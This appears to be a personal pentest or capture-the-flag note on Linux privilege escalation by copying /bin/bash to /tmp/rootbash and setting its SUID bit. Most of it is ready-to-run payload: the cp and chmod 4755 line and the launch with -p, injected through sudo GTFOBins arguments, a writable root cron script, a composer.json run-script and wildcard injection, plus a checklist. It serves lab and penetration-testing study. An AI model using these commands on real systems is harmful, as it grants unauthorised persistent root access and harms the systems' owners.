# SUID Binary Copy — Root-Run Command to Root Shell

**Trigger:** you can get **one command to run as root** — via `sudo -l`, a writable root cron job, a GTFOBins `run-script`, wildcard injection, etc. You don't need a full shell; a single root-run command is enough.

**The move:** have that root command make a **root-owned copy of `/bin/bash`** and flip the **SUID** bit on it. Then any user can spawn a root shell from the copy — the elevation outlives the original command.

---

## The one insight

A binary with the **SUID** bit set (`-rwsr-xr-x`, the `s`) runs with the **file owner's** privileges, not the caller's. If the command creating the copy runs as root, the copy is **owned by root** → SUID → anyone who runs it gets root.

`bash` drops elevated privileges on startup unless you pass **`-p`**, so always launch the copy with `-p`.

---

## The payload

Put this wherever the root-run command executes (sudo command, cron script, composer script, wildcard `priv.sh`, etc.):

```bash
cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
```

Then, as your normal user:

```bash
/tmp/rootbash -p
id            # euid=0(root)
```

- `chmod 4755` = SUID (`4`) + `rwxr-xr-x` (`755`) in one command.
- `cp` already copies bash's execute bits, so a separate `chmod +x` is never needed.
- Use a **fresh filename** (`rootbash`, not `bash`) — never overwrite a binary you're already executing (avoids `Text file busy`).

> `chmod +s` also works (`chmod +s /tmp/rootbash`) — `4755` is just the explicit one-command form.

---

## Works with any binary, not just bash

Any binary that gives you a shell or command execution works as the SUID copy. Bash is the cleanest because of `-p`.

| Copy this | Run it as |
|---|---|
| `/bin/bash` | `/tmp/rootbash -p` |
| `/bin/dash` / `/bin/sh` | `/tmp/rootsh` (no `-p` needed) |
| any writable-path binary a root job executes | plant your own → root runs it |

---

## Dropping it into common root-run primitives

**`sudo -l` gives a binary with free args** — use GTFOBins to run a command as root, and make that command the payload:
```bash
sudo <binary> ... 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'
```

**Writable file that root runs on a schedule** (found via `pspy`):
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /path/to/root-script
# wait for the cron/timer to fire, then:
/tmp/rootbash -p
```

**GTFOBins `run-script` style (e.g. composer, npm)** — put the payload in the script body:
```bash
echo '{"scripts":{"x":"cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash"}}' > composer.json
sudo /usr/bin/composer --working-dir=<dir> run-script x
/tmp/rootbash -p
```

**Wildcard injection** — payload lives in the injected script:
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > priv.sh
```

---

## Checklist

1. Confirm the command runs **as root** (not just as you).
2. Payload: `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash`.
3. Trigger it (sudo / cron / run-script / wildcard).
4. `/tmp/rootbash -p` → `id` shows `euid=0`.

---

## Related Notes

- [[Linux_Priv_Esc]]
- [[Tar-Wildcard-Sudo-to-Root]] — wildcard injection delivers this payload
- [[Lavita]] — composer `run-script` landed this
- [[pspy]] — how you find the writable root-scheduled job
